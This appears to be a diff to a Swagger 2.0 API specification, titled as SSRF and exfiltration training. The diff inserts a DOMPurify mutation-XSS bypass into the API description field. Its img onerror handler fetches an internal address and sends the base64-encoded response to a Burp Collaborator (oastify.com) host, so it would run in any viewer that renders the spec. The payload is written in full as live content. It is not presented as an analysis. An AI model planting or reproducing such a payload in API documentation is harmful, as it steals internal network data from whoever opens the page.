@@ -1,25 +1,29 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: SSRF & Data Exfiltration Demo
+  title: SSRF & Exfiltration Training
   description: |
-    <div style="font-family: sans-serif; border: 1px solid #dee2e6; padding: 25px; border-radius: 8px; max-width: 450px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
-      <h2 style="color: #d9534f; text-align: center; margin-top: 0;">Internal Admin Access</h2>
-      <p style="font-size: 14px; color: #666;">This portal requires authorization to access internal node <code>10.83.34.78</code>.</p>
-      
-      <div style="background: #f8f9fa; padding: 15px; border-radius: 4px; border-left: 4px solid #0275d8; margin: 15px 0;">
-        <small style="font-weight: bold; color: #495057;">TARGET ENDPOINT:</small><br>
-        <span style="font-family: monospace; color: #0275d8;">http://10.83.34.78/admin_panel</span>
-      </div>
+    <div style="text-align:center; padding:20px; border:1px solid #eee;">
+      <h3>Internal Security Gateway</h3>
+      <p>This demo uses a known DomPurify bypass to execute internal requests.</p>
 
-      <a href="https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/?action=auth&target=http://10.83.34.78/" 
-         style="display: block; background-color: #0275d8; color: white; text-align: center; padding: 12px; border-radius: 4px; text-decoration: none; font-weight: bold; margin-top: 20px;">
-        Authorize & Redirect to Internal IP
-      </a>
-      
-      <p style="font-size: 11px; color: #999; margin-top: 15px; text-align: center;">
-        Clicking "Authorize" logs the session to the auditor and bridges the request to the internal network.
-      </p>
+      <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea>
+      <img src='#' onerror='
+        (async () => {
+          const internalIp = "http://10.83.34.78/";
+          const collaborator = "https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/";
+          try {
+            // 1. Call Internal IP
+            const resp = await fetch(internalIp);
+            const data = await resp.text();
+            // 2. Send Response to Burp Collaborator (Base64 encoded)
+            fetch(collaborator + "?exfil=" + btoa(data));
+          } catch(e) {
+            // Log attempt if blocked by CORS
+            fetch(collaborator + "?log=attempted_internal_call");
+          }
+        })()
+      '>">
     </div>
 paths:
   /demo:
